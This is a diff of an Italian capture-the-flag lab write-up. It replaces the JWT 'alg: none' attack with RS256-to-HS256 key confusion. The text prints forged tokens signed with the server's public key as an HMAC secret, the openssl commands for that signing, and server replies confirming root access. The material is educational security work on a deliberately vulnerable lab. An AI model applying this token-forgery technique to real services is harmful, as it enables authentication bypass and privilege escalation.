@@ -158,30 +158,58 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGl
  
 **5) L'attacco**
 
-L'header del JWT indica al server *come* verificare la firma del Token appena inviato. Inserendo quindi all'interno dell'header un algoritmo diverso si può "ingannare" il server e forzare a verificare la firma con l'algoritmo indicato.
-Inserendo il valore *none* nella chiave *alg* dell'header ed escludendo la terza parte del JWT, quella relativa alla firma (poiché di fatto l'algoritmo *none* non effettua nessuna firma) si può provare ad ingannare il server.
+L'header del JWT indica al server *come* verificare la firma del Token appena inviato. Inserendo quindi all'interno dell'header un algoritmo diverso si può "ingannare" il server e forzare una verifica della firma con l'algoritmo indicato.
+Inserendo il valore *HS256* nella chiave *alg* dell'header, un authentication server vulnerabile potrà essere forzato ad utilizzare la chiave pubblica (facilmente reperibile) come una secret di un algoritmo simmetrico.
 
 Proviamo quindi a cambiare la stringa relativa all'Header con un nuovo JSON
  ```
  {
   "typ": "JWT",
-  "alg": "none"
+  "alg": "HS256"
 }
  ```
  Che codificato risulta essere
  ```
- ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0
+ ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIkhTMjU2Igp9
  ```
- Eliminiamo la terza parte, quella relativa alla firma (lasciando però il .), il nuovo JWT sarà quindi
+ Manteniamo inalterata la terza parte, quella relativa alla firma, il nuovo JWT sarà quindi
  ```
- ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9.
+ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIkhTMjU2Igp9.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9.XaI0mi79GAGZdxX5fU7EbuUtYTTcVElV5Z2g-XHsyk5rlv7TnFCIq8INVGELvwhVTRrCCVaSfg3l04fn6-tpogP19TH85QYz7iCVVlSw-8NWdcZKBdmO4YqCTdSqS8x-DazxYrXBTU77jIM-_zq3ZCjcEJ5xKLlh8COJjtWx2jA 
+```
+ Se proviamo a chiamare l'endpoint */scopriruolo* con questo JWT il server non sarà in grado di verificare la firma e restituirà un errore di tipo *DecodeError*.
+ 
+ Lo step successivo prevede quindi di inserire il contenuto della chiave pubblica per trattarlo come una password.
+ Prendiamo quindi la firma contenuta nel file pubkey.pem 
  ```
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDAanBinAA08lBXSXDLkc9gbeS8RtXFdm8SUBQRtjUrRU8u6uhekxtvrhdW6iLHBBVvkuxvysR9KD6aTFqMPrjRbM2aPaS1vdu/0WWa6TLPTsVBBA15kJra8803HYj58lXYP/DjVFgWLC3r4Bi5HhzBDpLHWUFcvn+QB7s3Q4+NwwIDAQAB
+ ```
+ 
+ Accediamo al sito [JWT.io](https://jwt.io/) e forgiamo un Token con le seguenti informazioni
+ 
+  ```
+ {
+  "typ": "JWT",
+  "alg": "HS256"
+}
+ ```
+  ```
+ {
+  "username": "studente_semplice",
+  "ruolo": "root"
+}
+ ```
+ 
+  Firmiamo le informazioni con il contenuto della chiave pubblica, il nuovo JWT sarà quindi
+ ```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0dWRlbnRlX3NlbXBsaWNlIiwicnVvbG8iOiJyb290In0.qUGoCmpprWNpwpVIVfji4TQPzdQrHwvy2Qz2kwmRQUQ
+```
  Se proviamo a chiamare l'endpoint */scopriruolo* con questo JWT il server risponderà in questo modo
  ```
  {
     "message": "Mi dispiace per te ma sei un fake root"
   }
  ```
+ 
  Questo perché nel codice è stato inserito un controllo per evitare che il ruolo possa essere scritto *in chiaro*. Cambiando ancora una volta il Payload ed usando il ruolo *codificato* *abcde* possiamo finalmente *catturare la bandiera*
  Proviamo però a cambiare la stringa relativa al Payload con un nuovo JSON
  ```
@@ -192,18 +220,19 @@ Proviamo quindi a cambiare la stringa relativa all'Header con un nuovo JSON
  ```
  Che codificato risulta essere
  ```
- ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJhYmNkZSIKfQ
+ eyJ1c2VybmFtZSI6InN0dWRlbnRlX3NlbXBsaWNlIiwicnVvbG8iOiJhYmNkZSJ9
  ```
  Il nuovo JWT sarà quindi
  ```
- ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJhYmNkZSIKfQ.
- ```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0dWRlbnRlX3NlbXBsaWNlIiwicnVvbG8iOiJhYmNkZSJ9.dGoTJpgnG8ZDFIo_9Mm03U4xlVT70RNAB6yJ5OHAq3o
+```
   Se proviamo a chiamare l'endpoint */scopriruolo* con questo JWT il server risponderà in questo modo
  ```
  {
     "message": "Sei ufficialmente root"
  }
  ```
+ 
 ## Conclusioni
 
 
@@ -212,5 +241,3 @@ Proviamo quindi a cambiare la stringa relativa all'Header con un nuovo JSON
 cat pubkey.pem | xxd -p | tr -d "\\n" > myhmac.txt
 
 openssl dgst -sha256 -hmac -hex -macopt hexkey:\$(cat myhmac.txt) -out hmac.txt /bin/ps
-
-https://www.getpostman.com/collections/4c9cf3a2d70263317bd6
